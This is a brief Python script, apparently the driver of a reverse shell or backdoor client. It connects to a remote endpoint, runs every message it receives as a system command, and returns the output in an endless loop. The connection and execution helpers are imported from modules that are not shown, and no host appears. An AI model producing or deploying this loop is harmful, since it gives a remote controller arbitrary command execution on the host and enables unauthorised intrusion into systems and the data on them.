import client_handler
import subprocess_handler

subprocess = subprocess_handler.Subprocess()
subprocess.start()

client = client_handler.Client()
client.start()
client.open_connect()

while True:
    client.send_message(subprocess.execute_command(client.receive_message()))
client.close_connect()
